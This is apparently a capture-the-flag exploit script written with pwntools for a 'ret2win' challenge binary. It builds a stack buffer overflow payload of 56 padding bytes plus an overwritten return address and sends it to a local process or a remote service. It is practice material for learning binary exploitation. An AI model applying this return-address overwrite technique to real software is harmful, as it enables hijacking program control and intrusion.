#!/usr/bin/env python3

from pwn import *

# ENV
#PORT = 13331
#HOST = "103.70.114.29"
exe = context.binary = ELF('./ret2win_chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# PAYLOAD
payload = flat(b'a'*56, 0x401146+5)

p.sendline(payload)
p.interactive()